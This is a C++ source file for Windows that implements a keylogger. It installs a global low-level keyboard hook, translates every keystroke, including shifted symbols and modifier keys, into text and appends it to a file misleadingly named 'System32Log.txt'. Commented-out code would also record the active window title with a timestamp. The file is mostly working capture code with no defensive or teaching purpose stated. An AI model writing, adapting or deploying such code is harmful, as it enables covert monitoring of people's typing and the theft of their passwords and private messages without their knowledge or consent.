#include <Windows.h>
#include <time.h>
#include <string>
#include <fstream>
#include <iostream>
#include <cstdio>
using namespace std;

// TODO
// Output file for raw vkCodes
// Output file for printable only?
// output shift key up, caps lock on/off
// ReleaseHook() ever called?
// Both shift keys down, releasing one should not change the unshifted

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

// Have to track the shift key status because APIs don't supply consistent result
bool capslock;
bool unshifted = 1;
bool uncontrolled = 1;
int Save(string key_string, char *file);
int translate(int vk, string & key_string);
extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	string key_string;
	if (nCode >= 0) { // the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN) {
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			errno = translate(kbdStruct.vkCode, key_string);
			// save to file
			Save(key_string, (char *) "System32Log.txt");
			cout << kbdStruct.vkCode << '=' << key_string << '\n';
		}
		else if (wParam == WM_KEYUP) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			switch (kbdStruct.vkCode) {
				case VK_SHIFT:
					key_string = "[SHIFT_UP]";
					unshifted = 1 ^ capslock;
					Save(key_string, (char *) "System32Log.txt");
					cout << kbdStruct.vkCode << '=' << key_string << '\n';
					break;
				case VK_RSHIFT:
					key_string = "[RSHIFT_UP]";
					unshifted = 1 ^ capslock;
					Save(key_string, (char *) "System32Log.txt");
					cout << kbdStruct.vkCode << '=' << key_string << '\n';
					break;
				case VK_LSHIFT:
					key_string = "[LSHIFT_UP]";
					unshifted = 1 ^ capslock;
					Save(key_string, (char *) "System32Log.txt");
					cout << kbdStruct.vkCode << '=' << key_string << '\n';
					break;
				case VK_CONTROL:
					key_string = "[VK_CONTROL_UP]";
					uncontrolled = 1;
					Save(key_string, (char *) "System32Log.txt");
					cout << kbdStruct.vkCode << '=' << key_string << '\n';
					break;
				case VK_LCONTROL:
					key_string = "[VK_LCONTROL_UP]";
					uncontrolled = 1;
					Save(key_string, (char *) "System32Log.txt");
					cout << kbdStruct.vkCode << '=' << key_string << '\n';
					break;
				case VK_RCONTROL:
					key_string = "[VK_RCONTROL_UP]";
					uncontrolled = 1;
					Save(key_string, (char *) "System32Log.txt");
					cout << kbdStruct.vkCode << '=' << key_string << '\n';
					break;
			}
			//return 0;
		}
		else if (wParam == WM_SYSKEYDOWN) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			errno = translate(kbdStruct.vkCode, key_string);
			Save("[ALT]"+key_string, (char *) "System32Log.txt");
			cout << kbdStruct.vkCode << '=' << "[ALT]" << key_string << '\n';
		}
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		MessageBox(NULL, (LPCWSTR) "Failed to install hook!", (LPCWSTR) "Error", MB_ICONERROR);
	}
}

void ReleaseHook() {
	UnhookWindowsHookEx(_hook);
}

int translate(int vk, string & key_string) {
	// written for US standard keyboard

	// ignore mouse clicks
	if ((vk == VK_LBUTTON) || (vk == VK_RBUTTON)  || 
		(vk == VK_MBUTTON) || (vk == VK_XBUTTON1) || (vk == VK_XBUTTON2))
		return 0;

	switch (vk) {
	case VK_CANCEL: key_string = "[CTRLBREAK]"; break;
	case VK_BACK: key_string = "[BACKSPACE]"; break;
	case VK_TAB: key_string = "[TAB]"; break;
	case VK_CLEAR: key_string = "[CLEAR]"; break;
	case VK_RETURN: key_string = "[RETURN]\n"; break;
	case VK_SHIFT: key_string = "[SHIFT_DN]"; unshifted = 0 ^ capslock; break;
	case VK_CONTROL: key_string = "[CONTROL_DN]"; uncontrolled = 0; break;
	case VK_MENU: key_string = "[ALT]"; break;
	case VK_PAUSE: key_string = "[PAUSE]"; break;
	case VK_CAPITAL: key_string = "[CAPSLOCK]"; capslock ^= 1; unshifted ^= 1; break;
	case VK_ESCAPE: key_string = "[ESCAPE]"; break;
	// IME 
	case VK_SPACE: key_string = " "; break;
	case VK_PRIOR: key_string = "[PAGEUP]"; break;
	case VK_NEXT: key_string = "[PAGEDOWN]"; break;
	case VK_END: key_string = "[END]"; break;
	case VK_HOME: key_string = "[HOME]"; break;
	case VK_LEFT: key_string = "[LARROW]"; break;
	case VK_UP: key_string = "[UPARROW]"; break;
	case VK_RIGHT: key_string = "[RARROW]"; break;
	case VK_DOWN: key_string = "[DOWNARROW]"; break;
	case VK_SELECT: key_string = "[SELECT]"; break;
	case VK_PRINT: key_string = "[PRINT]"; break;
	case VK_EXECUTE: key_string = "[EXECUTE]"; break;
	case VK_SNAPSHOT: key_string = "[PRINTSCREEN]"; break;
	case VK_INSERT: key_string = "[INSERT]"; break;
	case VK_DELETE: key_string = "[DELETE]"; break;
	case VK_HELP: key_string = "[HELP]"; break;
	// num and alpha values set later
	case VK_LWIN: key_string = "[LWIN]"; break;
	case VK_RWIN: key_string = "[RWIN]"; break;
	case VK_APPS: key_string = "[APPS]"; break;
	case VK_SLEEP: key_string = "[SLEEP]"; break;
	//numpad numbers set later
	case VK_MULTIPLY: key_string = "[NUM_MULTIPLY]"; break;
	case VK_ADD: key_string = "[NUM_ADD]"; break;
	case VK_SEPARATOR: key_string = "[NUM?SEPARATOR"; break;
	case VK_SUBTRACT: key_string = "-"; break; //NUM_PAD '-'
	case VK_DECIMAL: key_string = "."; break; //NUM_PAD '.'
	case VK_DIVIDE: key_string = "[NUM_DIVIDE]"; break;
	case VK_F1: key_string = "[F1]"; break;
	case VK_F2: key_string = "[F2]"; break;
	case VK_F3: key_string = "[F3]"; break;
	case VK_F4: key_string = "[F4]"; break;
	case VK_F5: key_string = "[F5]"; break;
	case VK_F6: key_string = "[F6]"; break;
	case VK_F7: key_string = "[F7]"; break;
	case VK_F8: key_string = "[F8]"; break;
	case VK_F9: key_string = "[F9]"; break;
	case VK_F10: key_string = "[F10]"; break;
	case VK_F11: key_string = "[F11]"; break;
	case VK_F12: key_string = "[F12]"; break;
	case VK_F13: key_string = "[F13]"; break;
	case VK_F14: key_string = "[F14]"; break;
	case VK_F15: key_string = "[F15]"; break;
	case VK_F16: key_string = "[F16]"; break;
	case VK_F17: key_string = "[F17]"; break;
	case VK_F18: key_string = "[F18]"; break;
	case VK_F19: key_string = "[F19]"; break;
	case VK_F20: key_string = "[F20]"; break;
	case VK_F21: key_string = "[F21]"; break;
	case VK_F22: key_string = "[F22]"; break;
	case VK_F23: key_string = "[F23]"; break;
	case VK_F24: key_string = "[F24]"; break;
	// unassigned
	case VK_NUMLOCK: key_string = "[NUMLOCK]"; break;
	case VK_SCROLL: key_string = "[SCROLLLOCK]"; break;
	// OEM & unassigned
	case VK_LSHIFT: key_string = "[LSHIFT_DN]"; unshifted = 0 ^ capslock; break;
	case VK_RSHIFT: key_string = "[RSHIFT_DN]"; unshifted = 0 ^ capslock; break;
	case VK_LCONTROL: key_string = "[LCONTROL_DN]"; uncontrolled = 0; break;
	case VK_RCONTROL: key_string = "[RCONTROL_DN]"; uncontrolled = 0; break;
	case VK_LMENU: key_string = "[LALT]"; break;
	case VK_RMENU: key_string = "[RALT]"; break;
	case VK_BROWSER_BACK: key_string = "[BROWSER_BACK]"; break;
	case VK_BROWSER_FORWARD: key_string = "[BROWSER_FORWARD]"; break;
	case VK_BROWSER_REFRESH: key_string = "[BROWSER_REFRESH]"; break;
	case VK_BROWSER_STOP: key_string = "[BROWSER_STOP]"; break;
	case VK_BROWSER_SEARCH: key_string = "[BROWSER_SEARCH]"; break;
	case VK_BROWSER_FAVORITES: key_string = "[BROWSER_FAVORITES]"; break;
	case VK_BROWSER_HOME: key_string = "[BROWSER_HOME]"; break;
	case VK_VOLUME_MUTE: key_string = "[VOLUME_MUTE]"; break;
	case VK_VOLUME_DOWN: key_string = "[VOLUME_DOWN]"; break;
	case VK_VOLUME_UP: key_string = "[VOLUME_UP]"; break;
	case VK_MEDIA_NEXT_TRACK: key_string = "[MEDIA_NEXT_TRACK]"; break;
	case VK_MEDIA_PREV_TRACK: key_string = "[MEDIA_PREV_TRACK]"; break;
	case VK_MEDIA_STOP: key_string = "[MEDIA_STOP]"; break;
	case VK_MEDIA_PLAY_PAUSE: key_string = "[MEDIA_PLAY_PAUSE]"; break;
	case VK_LAUNCH_MAIL: key_string = "[LAUNCH_MAIL]"; break;
	case VK_LAUNCH_MEDIA_SELECT: key_string = "[LAUNCH_MEDIA_SELECT]"; break;
	case VK_LAUNCH_APP1: key_string = "[LAUNCH_APP1]"; break;
	case VK_LAUNCH_APP2: key_string = "[LAUNCH_APP2]"; break;
	case VK_OEM_1: key_string = unshifted ? ";" : ":"; break;
	case VK_OEM_PLUS: key_string = unshifted ? "=" : "+"; break; // get VK_OEM_PLUS on the '=' key unshifted o.O
	case VK_OEM_COMMA: key_string = unshifted ? "," : "<"; break;
	case VK_OEM_MINUS: key_string = unshifted ? "-" : "_"; break;
	case VK_OEM_PERIOD: key_string = unshifted ? "." : ">"; break;
	case VK_OEM_2: key_string = unshifted ? "/" : "?"; break;
	case VK_OEM_3: key_string = unshifted ? "`" : "~"; break;
	// reserved & unassigned
	case VK_OEM_4: key_string = unshifted ? "[" : "{"; break;
	case VK_OEM_5: key_string = unshifted ? "\\" : "|"; break;
	case VK_OEM_6: key_string = unshifted ? "]" : "}"; break;
	case VK_OEM_7: key_string = unshifted ? "'" : "\""; break;
	default:
		char temp[2];
		if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
			sprintf_s(temp, "%c", (vk - 48)); // set to number
			key_string = temp;
		} else if (vk >= 65 && vk <= 90) { // A-Z
			if (unshifted) sprintf_s(temp, "%c", (vk + 32));
			else sprintf_s(temp, "%c", vk);
			key_string = temp;
		} else if (vk >= 0x30 && vk <= 0x39) { // 0-9
			if (unshifted) {
				sprintf_s(temp, "%c", vk);
				key_string = temp;
			} else {
				switch (vk) {
				case 0x30: key_string = ")"; break;
				case 0x31: key_string = "!"; break;
				case 0x32: key_string = "@"; break;
				case 0x33: key_string = "#"; break;
				case 0x34: key_string = "$"; break;
				case 0x35: key_string = "%"; break;
				case 0x36: key_string = "^"; break;
				case 0x37: key_string = "&"; break;
				case 0x38: key_string = "*"; break;
				case 0x39: key_string = "("; break;
				}
			}
		} else {
			sprintf_s(temp, "%s%x.2%s", "[Raw KeyCode 0x", vk, "]");
			key_string = temp;
		}
		break;
	}
	return 0;
}

int Save(string key_string, char *file) {
	ofstream OUTPUT_FILE (file, ios::app);
	OUTPUT_FILE << key_string;

	//HWND foreground = GetForegroundWindow();
	//if (foreground)	{
	//	char window_title[256];
	//	GetWindowText(foreground, (LPWSTR) window_title, 256);

	//	if (strcmp(window_title, lastwindow) != 0) {
	//		strcpy_s(lastwindow, sizeof(char)*256, window_title);

	//		// get time
	//		time_t t = time(NULL);
	//		struct tm tm;
	//		errno = localtime_s(&tm, &t);
	//		char s[64];
	//		strftime(s, sizeof(s), "%c", &tm);

	//		fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
	//	}
	//}

	OUTPUT_FILE.close();
	return 0;
}

int main() {
	SetHook();
	
	capslock = ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) ? 0 : 1;
	unshifted ^= capslock;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) // loop to keep the console application running.
	{}
}
